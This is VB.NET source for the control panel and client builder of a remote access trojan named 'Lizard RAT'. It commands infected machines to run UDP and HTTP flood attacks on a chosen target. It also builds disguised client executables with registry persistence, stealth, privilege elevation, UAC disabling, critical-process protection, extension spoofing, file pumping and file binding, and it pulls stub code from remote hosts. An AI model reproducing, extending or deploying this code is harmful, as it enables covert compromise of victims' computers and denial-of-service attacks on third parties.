    Private Sub showcon(ByVal client As String, ByVal ip As String, ByVal country As String, ByVal socket As String)
        frmConnected.ip = ip
        frmConnected.socket = socket
        frmConnected.client = client
        frmConnected.country = country
        frmConnected.dismiss = 5
        frmConnected.Show()
    End Sub


    Public Function Country(ByVal ip As String) As String
        If api = True Then
            Try
                Dim splitter() As String
                Dim c As String
                Dim address As String = "http://www.telize.com/geoip/" + ip
                Dim client As WebClient = New WebClient()
                Dim reader As StreamReader = New StreamReader(client.OpenRead(address))
                c = reader.ReadToEnd
                Dim delim As String() = New String() {"country" & Chr(34) & ":"}
                splitter = c.Split(delim, StringSplitOptions.None)
                splitter = splitter(1).Split(Chr(34))
                Return splitter(1)
            Catch ex As Exception
                api = False
                Return "API Error"
            End Try
        Else
            Return "API Error"
        End If
    End Function

    Public Function Countrycode(ByVal ip As String) As String
        If api = True Then
            Try
                Dim splitter() As String
                Dim c As String
                Dim address As String = "http://www.telize.com/geoip/" + ip
                Dim client As WebClient = New WebClient()
                Dim reader As StreamReader = New StreamReader(client.OpenRead(address))
                c = reader.ReadToEnd
                Dim delim As String() = New String() {"country_code" & Chr(34) & ":"}
                splitter = c.Split(delim, StringSplitOptions.None)
                splitter = splitter(1).Split(Chr(34))
                Return splitter(1).ToLower
            Catch e As Exception
                api = False
                Return "RD"
            End Try
        Else
            Return "RD"
        End If
    End Function

    Public Sub pump(ByVal sizer As Integer)
        Dim filesize As Double = Val(sizer)
        filesize = filesize * 1024
        Dim filetopump = System.IO.File.OpenWrite(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\client.exe")
        Dim size = filetopump.Seek(0, System.IO.SeekOrigin.[End])
        While size < filesize
            filetopump.WriteByte(0)
            size += 1
        End While
        filetopump.Close()
    End Sub

    Public Function GenerateMutex() As String
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        Dim r As New Random
        Dim sb As String = ""
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 61)
            sb += s.Substring(idx, 1)
        Next
        Return sb
    End Function

    Public Sub GetProfiles()
        Dim dir As String = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", "") & "\Profiles\"
        If Not Directory.Exists(dir) Then
            Directory.CreateDirectory(dir)
        End If
        Dim fileEntries As String() = System.IO.Directory.GetFiles(dir)
        cmbProfiles.Items.Clear()
        Dim fileName As String
        For Each fileName In fileEntries
            Dim name() As String = fileName.Split("\")
            cmbProfiles.Items.Add(name(name.Length - 1))
        Next
    End Sub

    Public Sub removeCInfo(endpoint As String)
        Dim ip() As String = endpoint.Split(":")
        If lblcIP.Text.Contains(ip(0)) And lblcIP.Text.Contains(ip(1)) Then
            lblcIP.Text = ""
            lblcVersion.Text = ""
            lblcLocation.Text = ""

            lblcUser.Text = ""
            lblcPCName.Text = ""
            lblcOS.Text = ""
            lblcCountry.Text = ""
            lblcAV.Text = ""
            lblcMonitor.Text = ""

            pboxDesktop.Image = Nothing
        End If
    End Sub

#End Region

#Region " LV Stuff "
    Friend Shared Function ListView_GetItem(ByVal hwnd As IntPtr, ByRef lvi As LVITEM) As Boolean
        Return CBool(SendMessage(hwnd, LVM_GETITEM,
        IntPtr.Zero, lvi))
    End Function

    Friend Shared Function ListView_SetItem(ByVal hwnd As IntPtr, ByRef lvi As LVITEM) As Boolean
        Return CBool(SendMessage(hwnd, LVM_SETITEM,
        IntPtr.Zero, lvi))
    End Function


    Friend Shared Sub ListView_SetSubItemImageIndex(ByVal hwnd As IntPtr, ByVal index As Integer, ByVal subItemIndex As Integer, ByVal imageIndex As Integer)

        Dim lvi As LVITEM

        lvi = Nothing

        lvi.iItem = index
        lvi.subItem = subItemIndex
        lvi.iImage = imageIndex
        lvi.mask = LVIF_IMAGE
        ListView_SetItem(hwnd, lvi)

    End Sub

    Friend Shared Function ListView_GetSubItemImageIndex(ByVal hwnd As IntPtr, ByVal index As Integer, ByVal subItemIndex As Integer) As Integer

        Dim lvi As LVITEM

        lvi = Nothing

        lvi.iItem = index
        lvi.subItem = subItemIndex
        lvi.mask = LVIF_IMAGE
        If ListView_GetItem(hwnd, lvi) Then
            Return lvi.iImage
        Else
            Return -1
        End If

    End Function
#End Region

#Region " Server Form Events "

    Public Async Function GetPage() As Task(Of String)
        Dim GetPageTask As Task(Of String) = Task.Factory.StartNew(Function()
                                                                       Try
                                                                           _FileString = ""
                                                                           While _FileString = ""
                                                                               Dim Data As Byte() = New WebClient().DownloadData(Seal.GetSetting("Host") & Modulename & "&user=" & Seal.UserName)
                                                                               _FileString = System.Text.Encoding.UTF8.GetString(Data)

                                                                               '_FileString = _FileString.Substring(0, _FileString.Length - 2)
                                                                           End While
                                                                           _FileString = _FileString.Replace("<br>", vbNewLine)
                                                                           _FileString = _FileString.Substring(1, _FileString.Length - 1)
                                                                           Return _FileString
                                                                       Catch
                                                                           Try
                                                                               _FileString = ""
                                                                               While _FileString = ""
                                                                                   Dim Data As Byte() = New WebClient().DownloadData(Seal.GetSetting("BackupHost") & Modulename & "&user=" & Seal.UserName)
                                                                                   _FileString = System.Text.Encoding.UTF8.GetString(Data)

                                                                                   '_FileString = _FileString.Substring(0, _FileString.Length - 2)
                                                                               End While
                                                                               _FileString = _FileString.Replace("<br>", vbNewLine)
                                                                               _FileString = _FileString.Substring(1, _FileString.Length - 1)
                                                                               Return _FileString
                                                                           Catch
                                                                               Return Nothing
                                                                           End Try
                                                                       End Try

                                                                   End Function)
        Dim result As String = Await GetPageTask
        Return result
    End Function


    Private Sub UDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UDPToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim IP As String = InputBox("IP to Flood", "UDP Flood")
            Dim Port As String = InputBox("Port to Flood", "UDP Flood")
            For Each lv As ListViewItem In lstConnections.SelectedItems
                SendAnyPacket(lv.SubItems(9).Text, CByte(PacketHeader.StartUDP), IP, Port)
                ddosudp.Add(lv.SubItems(9).Text, "UDP->" & IP & ":" & Port)
            Next
            txtStressLog.Text += Date.Now.ToString("t") & " UDP Flood started -> " & IP & ":" & Port & " with " & lstConnections.SelectedItems.Count & " clients" & vbNewLine
            lstDDoS.Items.Add("UDP->" & IP & ":" & Port)
        End If
    End Sub

    Private Sub StopDDoSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopDDoSToolStripMenuItem.Click
        If lstDDoS.SelectedItems.Count > 0 Then
            If lstDDoS.SelectedItems(0).Text.Contains("UDP") Then
                For i = 0 To ddosudp.Count - 1
                    If ddosudp.Keys(i) = lstDDoS.SelectedItems(0).Text Then
                        SendAnyPacket(ddosudp(ddosudp.Keys(i)).ToString, CByte(PacketHeader.StopUDP))
                        ddosudp.Remove(ddosudp.Keys(i))
                    End If
                Next


                txtStressLog.Text += Date.Now.ToString("t") & " UDP Flood stopped" & vbNewLine
            Else
                For i = 0 To ddoshttp.Count - 1
                    If ddoshttp.Keys(i) = lstDDoS.SelectedItems(0).Text Then
                        SendAnyPacket(ddoshttp(ddoshttp.Keys(i)).ToString, CByte(PacketHeader.StopHTTP))
                        ddoshttp.Remove(ddoshttp.Keys(i))
                    End If
                Next
                txtStressLog.Text += Date.Now.ToString("t") & " HTTP Flood stopped" & vbNewLine
            End If

            lstDDoS.SelectedItems(0).Remove()
        End If
    End Sub

    Private Sub HTTPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HTTPToolStripMenuItem.Click
        If lstConnections.SelectedItems.Count > 0 Then
            Dim IP As String = InputBox("IP/Host to Flood", "HTTP Flood")
            For Each lv As ListViewItem In lstConnections.SelectedItems
                SendAnyPacket(lv.SubItems(9).Text, CByte(PacketHeader.StartHTTP), IP)
                Try
                    ddoshttp.Add(lv.SubItems(9).Text, "HTTP->" & IP)
                Catch : End Try
            Next
            txtStressLog.Text += Date.Now.ToString("t") & " HTTP Flood started -> " & IP & " with " & lstConnections.SelectedItems.Count & " clients" & vbNewLine
            lstDDoS.Items.Add("HTTP->" & IP)
        End If
    End Sub

    Private Sub cmdstartUDP_Click(sender As Object, e As EventArgs) Handles cmdstartUDP.Click
        If lstConnections.Items.Count > 0 Then
            Dim IP As String = InputBox("IP to Flood", "UDP Flood")
            Dim Port As String = InputBox("Port to Flood", "UDP Flood")
            For Each lv As ListViewItem In lstConnections.Items
                SendAnyPacket(lv.SubItems(9).Text, CByte(PacketHeader.StartUDP), IP, Port)
                Try
                    ddosudp.Add(lv.SubItems(9).Text, "UDP->" & IP & ":" & Port)
                Catch : End Try
            Next
            txtStressLog.Text += Date.Now.ToString("t") & " UDP Flood started -> " & IP & ":" & Port & " with " & lstConnections.Items.Count & " clients" & vbNewLine
            lstDDoS.Items.Add("UDP->" & IP & ":" & Port)
        End If
    End Sub

    Private Sub cmdstartHTTP_Click(sender As Object, e As EventArgs) Handles cmdstartHTTP.Click
        If lstConnections.Items.Count > 0 Then
            Dim IP As String = InputBox("IP/Host to Flood", "HTTP Flood")
            For Each lv As ListViewItem In lstConnections.Items
                SendAnyPacket(lv.SubItems(9).Text, CByte(PacketHeader.StartHTTP), IP)
                ddoshttp.Add(lv.SubItems(9).Text, "HTTP->" & IP)
            Next
            txtStressLog.Text += Date.Now.ToString("t") & " HTTP Flood started -> " & IP & " with " & lstConnections.Items.Count & " clients" & vbNewLine
            lstDDoS.Items.Add("HTTP->" & IP)
        End If
    End Sub

    Private Sub TabControlClass1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles TabControlClass1.SelectedIndexChanged
        If TabControlClass1.SelectedIndex = 4 Then
            Dim mapclients As String = ""
            Dim mapdata As New Dictionary(Of String, Integer)
            Dim list As New Dictionary(Of Integer, String)
            For Each lv As ListViewItem In lstConnections.Items
                If lv.SubItems(3).Text <> "API Error" Then
                    Try
                        mapdata(lv.SubItems(3).Text) += 1
                    Catch ex As Exception
                        mapdata.Add(lv.SubItems(3).Text, 1)
                        list.Add(list.Count, lv.SubItems(3).Text)
                    End Try
                End If
            Next

            If mapdata.Count > 0 Then
                For i = 0 To mapdata.Count - 1
                    mapclients += "['" & list(i) & "', " & mapdata(list(i)) & "]" & vbNewLine
                Next

                WebBrowser1.DocumentText = txtmap1.Text & mapclients & txtmap2.Text
            End If
        End If
    End Sub

    Private Sub cmdScanner_Click(sender As Object, e As EventArgs) Handles cmdScanner.Click
        Dim ofd As New OpenFileDialog
        ofd.FileName = ""
        ofd.Filter = "EXE File|*.exe"

        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            txtscanner.Text = ofd.FileName
            Dim rs As New RazorScanner
            rs.Scan("Thesgtluca", "09f83a12353a924224cadfe396e812bd", ofd.FileName)
        End If
    End Sub

    Private Sub cmdAddPort_Click(sender As Object, e As EventArgs) Handles cmdAddPort.Click
        Try
            mappings.Add(txtExtPort.Text, "TCP", txtExtPort.Text, GetIPAddress, True, "LizardRAT")
            lstPorts.Items.Add(txtExtPort.Text)
        Catch ex As Exception
            MessageBox.Show("There was an Error forwarding the Port" & vbNewLine & "Make sure uPnP is enabled in your router", "Lizard RAT", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    Private Sub frmMain_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If File.Exists(Application.StartupPath & "\OnConnect.dat") Then
            File.Delete(Application.StartupPath & "\OnConnect.dat")
        End If
        If File.Exists(Application.StartupPath & "\uPnP.dat") Then
            File.Delete(Application.StartupPath & "\uPnP.dat")
        End If
        Dim myFile As String = Application.StartupPath & "\OnConnect.dat" '// file location.
        Dim myWriter As New IO.StreamWriter(myFile)
        For Each myItem As ListViewItem In lstOnConnect.Items
            myWriter.WriteLine(myItem.Text & "|" & myItem.SubItems(1).Text & "|" & myItem.SubItems(2).Text)
        Next
        myWriter.Close()

        myFile = Application.StartupPath & "\uPnP.dat"
        For Each myItem As ListViewItem In lstPorts.Items
            myWriter.WriteLine(myItem.Text & "|" & myItem.SubItems(1).Text)
        Next
        myWriter.Close()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
        Try
            If System.IO.File.Exists(Application.StartupPath & "\uPnP.dat") = True Then
                Dim objReader As New System.IO.StreamReader(Application.StartupPath & "\uPnP.dat")
                Dim line As String
                Dim info1() As String
                Do While objReader.Peek() <> -1
                    line = objReader.ReadLine()
                    info1 = line.Split("|")
                    Dim lvi As New ListViewItem
                    lvi.Text = info1(0)
                    lvi.SubItems.Add(info1(1))
                    lstPorts.Items.Add(lvi)
                Loop
            End If
        Catch : End Try
        Modulename = "MOTD"
        txtMOTD.Text = System.Text.Encoding.UTF8.GetString(New WebClient().DownloadData(Seal.GetSetting("Host") & Modulename & "&user=" & Seal.UserName)).Replace("<br>", vbNewLine)
        Modulename = "Updates"
        Dim updatelines() As String = System.Text.Encoding.UTF8.GetString(New WebClient().DownloadData(Seal.GetSetting("Host") & Modulename & "&user=" & Seal.UserName)).Replace("<br>", vbCrLf).Split(vbCrLf)
        For i = 0 To updatelines.Count - 2
            Try
                Dim updates() As String = updatelines(i).Split("|")
                Dim lvi As New ListViewItem
                lvi.ImageKey = updates(0).Replace(vbLf, "")
                lvi.Text = ""
                lvi.SubItems.Add(updates(1))
                lvi.SubItems.Add(updates(2))
                lstUpdates.Items.Add(lvi)
            Catch : End Try
        Next
        Dim FILE_NAME As String = Application.StartupPath & "\OnConnect.dat"
        Dim TextLine As String
        Dim info() As String
        If System.IO.File.Exists(FILE_NAME) = True Then
            Dim objReader As New System.IO.StreamReader(FILE_NAME)
            Do While objReader.Peek() <> -1
                TextLine = objReader.ReadLine()
                info = TextLine.Split("|")
                Dim lvi As New ListViewItem
                lvi.Text = info(0)
                lvi.SubItems.Add(info(1))
                lvi.SubItems.Add(info(2))
                lstOnConnect.Items.Add(lvi)
            Loop
        End If
        Dim reader As New modINI
        Me.Text = "Lizard RAT " & Application.ProductVersion & " - 0 Client(s) connected"
        Label8.Text = "Lizard RAT " & Application.ProductVersion & " "

        Try
            txthost.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me")
            txtDataPort.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778")
            txtPort.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "port", "777")
            txtPasswd.Text = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "password", "passwd")
            chkListen.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "startlisten", False)
            chkPasswd.Checked = reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "checkpw", False)
        Catch : End Try
        ToolStripStatusLabel4.Text = "Listening on: " & txtPort.Text & ", " & txtDataPort.Text
        PublicKey = RSA.ExportCspBlob(False)
        GetProfiles()
        If chkListen.Checked = True Then
            Call cmdListen_Click("", Nothing)
        End If
        txtMutex.Text = GenerateMutex()
        SendMessage(lstConnections.Handle, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_SUBITEMIMAGES, LVS_EX_SUBITEMIMAGES)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Clientname.Width = 0
    End Sub

    Private Sub lstDesktops_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles lstDesktops.MouseDoubleClick
        Dim ip() As String = lstDesktops.SelectedItems.Item(0).Text.Split(":")
        Dim namer As String = "Control: [" & ip(0) & "] - Socket [" & ip(1) & "]"
        Try
            rdp.Add(lstDesktops.SelectedItems.Item(0).Text, False)
            frm.Add(lstDesktops.SelectedItems.Item(0).Text, New x(namer, lstDesktops.SelectedItems.Item(0).Text))
            frm(lstDesktops.SelectedItems.Item(0).Text).Show()
        Catch
            frm(lstDesktops.SelectedItems.Item(0).Text).Focus()
        End Try
    End Sub

    Private Sub tmrcons_Tick(sender As Object, e As EventArgs) Handles tmrcons.Tick
        Me.Text = "Lizard RAT " & Application.ProductVersion & " - " & clients & " Client(s) connected"
        sentbytes.Text = clients
    End Sub

    Private Async Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        If chkTOS.Checked = False Then
            MessageBox.Show("Please accept the T.O.S. to Build a client", Label8.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If chkHKLM.Checked = True And txtstartupLM.Text = "" Then
            MessageBox.Show("Please enter a name for the HKLM Startup", Label8.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If

        If txtstartup.Enabled = True And txtstartup.Text = "" Then
            MessageBox.Show("Please enter a name for the HKCU Startup", Label8.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        ProgressBar1.Value = 0
        Try
            Dim path As String = ""
            'Dim _textStreamReader As StreamReader
            'Dim _assembly As [Assembly]
            Dim source As String
            Dim HKLM As String
            Dim HKCU As String
            Dim Once As String
            Dim Elevate As String
            Dim Hidden As String
            Dim Hide As String
            Dim UAC As String
            Dim UndoCritical As String
            Dim MakeCritical As String
            Dim DimCritical As String
            Dim HandlerCritical As String
            Dim ClassCritical As String
            Dim Visible As String
            Dim VisibleHandler As String

            lstBuild.Items.Clear()
            lstBuild.Items.Add("Getting stub code")
            Application.DoEvents()

            '_assembly = [Assembly].GetExecutingAssembly()
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.Client.txt"))
            Modulename = "Client"
            Dim MyTask As Task(Of String) = GetPage()
            source = Await MyTask

            '_assembly = [Assembly].GetExecutingAssembly()
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.Visible.txt"))
            Modulename = "Visible"
            Dim MyTask1 As Task(Of String) = GetPage()
            Visible = Await MyTask1

            '_assembly = [Assembly].GetExecutingAssembly()
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.VisibleHandler.txt"))
            Modulename = "VisibleHandler"
            Dim MyTask2 As Task(Of String) = GetPage()
            VisibleHandler = Await MyTask2
            ProgressBar1.Value += 3


            If chkElevate.Checked = True Or chkcritical.Checked = True Or chkUAC.Checked = True Or chkHKLM.Checked = True Or RadioButton2.Checked = True Or RadioButton3.Checked = True Then
                source = source.Replace("[admin]", "true")
            Else
                source = source.Replace("[admin]", "false")
            End If

            If chkStealth.Checked = False Then
                source = source.Replace("[visible]", Visible)
                source = source.Replace("[visiblehandler]", VisibleHandler)
            Else
                source = source.Replace("[visible]", "")
                source = source.Replace("[visiblehandler]", "")
                lstBuild.Items.Add("Stealthmode activated")
            End If

            lstBuild.Items.Add("Getting function codes")
            Application.DoEvents()

            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.FuncHKLM.txt"))
            Modulename = "FuncHKLM"
            Dim MyTask3 As Task(Of String) = GetPage()
            HKLM = Await MyTask3
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.FuncHKCU.txt"))
            Modulename = "FuncHKCU"
            Dim MyTask4 As Task(Of String) = GetPage()
            HKCU = Await MyTask4
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.FuncOnce.txt"))
            Modulename = "FuncOnce"
            Dim MyTask5 As Task(Of String) = GetPage()
            Once = Await MyTask5
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.ElevateAdmin.txt"))
            Modulename = "ElevateAdmin"
            Dim MyTask6 As Task(Of String) = GetPage()
            Elevate = Await MyTask6
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.Hidden.txt"))
            Modulename = "Hidden"
            Dim MyTask7 As Task(Of String) = GetPage()
            Hidden = Await MyTask7
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.Hide.txt"))
            Modulename = "Hide"
            Dim MyTask8 As Task(Of String) = GetPage()
            Hide = Await MyTask8
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.DisableUAC.txt"))
            Modulename = "DisableUAC"
            Dim MyTask9 As Task(Of String) = GetPage()
            UAC = Await MyTask9
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.UndoCritical.txt"))
            Modulename = "UndoCritical"
            Dim MyTask10 As Task(Of String) = GetPage()
            UndoCritical = Await MyTask10
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.MakeCritical.txt"))
            Modulename = "MakeCritical"
            Dim MyTask11 As Task(Of String) = GetPage()
            MakeCritical = Await MyTask11
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.DimCritical.txt"))
            Modulename = "DimCritical"
            Dim MyTask12 As Task(Of String) = GetPage()
            DimCritical = Await MyTask12
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.HandlerCritical.txt"))
            Modulename = "HandlerCritical"
            Dim MyTask13 As Task(Of String) = GetPage()
            HandlerCritical = Await MyTask13
            ProgressBar1.Value += 1
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.ClassCritical.txt"))
            Modulename = "ClassCritical"
            Dim MyTask14 As Task(Of String) = GetPage()
            ClassCritical = Await MyTask14

            ProgressBar1.Value += 3
            If chkinstall.Checked = True Then
                lstBuild.Items.Add("Editing installpath")
                Application.DoEvents()
                If RadioButton1.Checked = True Then
                    path = "ApplicationData"
                ElseIf RadioButton2.Checked = True Then
                    path = "System"
                Else
                    path = "ProgramFiles"
                End If
                source = source.Replace("[sname]", txtname.Text)
            Else
                lstBuild.Items.Add("No installpath given")
                Application.DoEvents()
                path = "[installpath]"
                source = source.Replace(Chr(34) & "[sname]" & Chr(34), "System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName")
            End If
            ProgressBar1.Value += 4

            lstBuild.Items.Add("Editing global values")
            Application.DoEvents()
            source = source.Replace("[port]", txtbuildport.Text)
            source = source.Replace("[passwd]", txtbuildpasswd.Text)
            source = source.Replace("[host]", txtbuildhost.Text)
            source = source.Replace("[backuphost]", txtbackuphost.Text)
            source = source.Replace("[group]", txtbuildgroup.Text)
            source = source.Replace("[version]", Application.ProductVersion)
            source = source.Replace("[mutex]", txtMutex.Text)
            ProgressBar1.Value += 5

            lstBuild.Items.Add("Editing install values")
            Application.DoEvents()
            source = source.Replace("[startname]", txtstartup.Text)
            source = source.Replace("[startnameLM]", txtstartupLM.Text)
            source = source.Replace("[installpath]", path)
            If txtFolder.Text <> "" Then
                source = source.Replace("[folder]", "\" & txtFolder.Text)
            Else
                source = source.Replace("[folder]", "")
            End If

            If chkinstall.Checked = True Then
                lstBuild.Items.Add("Editing registry values")
                Application.DoEvents()
                If chkHKCU.Checked = True Then
                    source = source.Replace("[FuncHKCU]", HKCU)
                    source = source.Replace("[RunHKCU]", "InstallHKCU()")
                Else
                    source = source.Replace("[FuncHKCU]", "")
                    source = source.Replace("[RunHKCU]", "")
                End If

                If chkHKLM.Checked = True Then
                    source = source.Replace("[FuncHKLM]", HKLM)
                    source = source.Replace("[RunHKLM]", "InstallHKLM()")
                Else
                    source = source.Replace("[FuncHKLM]", "")
                    source = source.Replace("[RunHKLM]", "")
                End If

                If cmbRunOnce.Text = "Yes" Then
                    source = source.Replace("[FuncOnce]", Once)
                    source = source.Replace("[RunOnce]", "InstallOnce()")
                    source = source.Replace("[RunOnceRefresh]", "")
                ElseIf cmbRunOnce.Text = "No" Then
                    source = source.Replace("[FuncOnce]", "")
                    source = source.Replace("[RunOnce]", "")
                    source = source.Replace("[RunOnceRefresh]", "")
                Else
                    source = source.Replace("[FuncOnce]", Once)
                    source = source.Replace("[RunOnceRefresh]", "InstallOnce()")
                    source = source.Replace("[RunOnce]", "")
                End If

            Else
                source = source.Replace("Private installpath as string = System.Environment.GetFolderPath(System.Environment.SpecialFolder.[installpath])", "Private installpath as string = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) '")
                source = source.Replace("[sname]", "System.IO.Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location)")
                source = source.Replace("[FuncOnce]", "")
                source = source.Replace("[RunOnce]", "")
                source = source.Replace("[RunOnceRefresh]", "")
                source = source.Replace("[FuncHKLM]", "")
                source = source.Replace("[RunHKLM]", "")
                source = source.Replace("[FuncHKCU]", "")
                source = source.Replace("[RunHKCU]", "")
            End If

            If chkshowhidden.Checked = True Then
                source = source.Replace("[FuncHide]", Hide)
                source = source.Replace("[Hide]", "Hide()")
                lstBuild.Items.Add("Writing hide function")
                Application.DoEvents()
            Else
                source = source.Replace("[FuncHide]", "")
                source = source.Replace("[Hide]", "")
            End If

            If chkHidden.Checked = True Then
                lstBuild.Items.Add("Writing hidden files function")
                Application.DoEvents()
                source = source.Replace("[FuncHidden]", Hidden)
                source = source.Replace("[Hidden]", "Hidden()")
            Else
                source = source.Replace("[FuncHidden]", "")
                source = source.Replace("[Hidden]", "")
            End If



            If chkElevate.Checked = True Then
                lstBuild.Items.Add("Writing elevate function")
                Application.DoEvents()
                source = source.Replace("[FuncElevate]", Elevate)
                source = source.Replace("[Elevate]", "ElevateAdmin()")
            Else
                source = source.Replace("[FuncElevate]", "")
                source = source.Replace("[Elevate]", "")
            End If

            If chkUAC.Checked = True Then
                lstBuild.Items.Add("Writing UAC function")
                Application.DoEvents()
                source = source.Replace("[FuncDisableUAC]", UAC)
                source = source.Replace("[DisableUAC]", "DisableUAC()")
            Else
                source = source.Replace("[FuncDisableUAC]", "")
                source = source.Replace("[DisableUAC]", "")
            End If

            If chkcritical.Checked = True Then
                lstBuild.Items.Add("Writing critical function")
                Application.DoEvents()
                source = source.Replace("[ClassCritical]", ClassCritical)
                source = source.Replace("[HandlerCritical]", HandlerCritical)
                source = source.Replace("[DimCritical]", DimCritical)
                source = source.Replace("[MakeCritical]", MakeCritical)
                source = source.Replace("[UndoCritical]", UndoCritical)
            Else
                source = source.Replace("[ClassCritical]", "")
                source = source.Replace("[HandlerCritical]", "")
                source = source.Replace("[DimCritical]", "")
                source = source.Replace("[MakeCritical]", "")
                source = source.Replace("[UndoCritical]", "")
            End If

            ProgressBar1.Value += 3
            lstBuild.Items.Add("Writing assemblies")
            Application.DoEvents()
            source = source.Replace(Chr(34) + "Title" + Chr(34), Chr(34) + txtTitle.Text + Chr(34))
            source = source.Replace(Chr(34) + "Description" + Chr(34), Chr(34) + txtDescription.Text + Chr(34))
            source = source.Replace(Chr(34) + "Company" + Chr(34), Chr(34) + txtCompany.Text + Chr(34))
            source = source.Replace(Chr(34) + "Product" + Chr(34), Chr(34) + txtProduct.Text + Chr(34))
            source = source.Replace(Chr(34) + "Copyright" + Chr(34), Chr(34) + txtCopyright.Text + Chr(34))
            source = source.Replace(Chr(34) + "Trademark" + Chr(34), Chr(34) + txtTrademark.Text + Chr(34))
            source = source.Replace("FileVersion(" + Chr(34) + "1.0.0.0" + Chr(34), "FileVersion(" + Chr(34) + txtFileVersion1.Text + "." + txtFileVersion2.Text + "." + txtFileVersion3.Text + "." + txtFileVersion4.Text + Chr(34))
            source = source.Replace("Version(" + Chr(34) + "1.0.0.0" + Chr(34), "Version(" + Chr(34) + txtVersion1.Text + "." + txtVersion2.Text + "." + txtVersion3.Text + "." + txtVersion4.Text + Chr(34))
            ProgressBar1.Value += 3

            lstBuild.Items.Add("Compiling Client.exe")
            Application.DoEvents()
            Dim sfd As New SaveFileDialog
            sfd.FileName = ""
            sfd.Filter = "EXE File|*.exe"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                If cmbspoof.Text <> "None" And cbBind.Checked = False Then
                    sfd.FileName = sfd.FileName.Replace("exe", cmbspoof.Text & ".exe")
                    Compile(sfd.FileName, source, Application.StartupPath & "\Icons\" & cmbspoof.Text & ".ico")
                Else
                    Compile(sfd.FileName, source, ofdIcon.FileName)
                End If

                ProgressBar1.Value += 2
                If chkpump.Checked = True Then
                    lstBuild.Items.Add("Increasing filesize")
                    pump(txtsize.Text)
                End If

                If cbBind.Checked = True Then
                    lstBuild.Items.Add("Binding files")
                    If cmbspoof.Text <> "None" Then
                        sfd.FileName = sfd.FileName.Replace("exe", cmbspoof.Text & ".exe")
                        Await ExeBind(sfd.FileName, txtBind.Text, Application.StartupPath & "\Icons\" & cmbspoof.Text & ".ico")
                    Else
                        Await ExeBind(sfd.FileName, txtBind.Text, "")
                    End If

                End If

                ProgressBar1.Value += 4
                lstBuild.Items.Add("Done!")
                MessageBox.Show("Client built in " & sfd.FileName & "!", "Lizard RAT", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try

        ProgressBar1.Value = 0
    End Sub


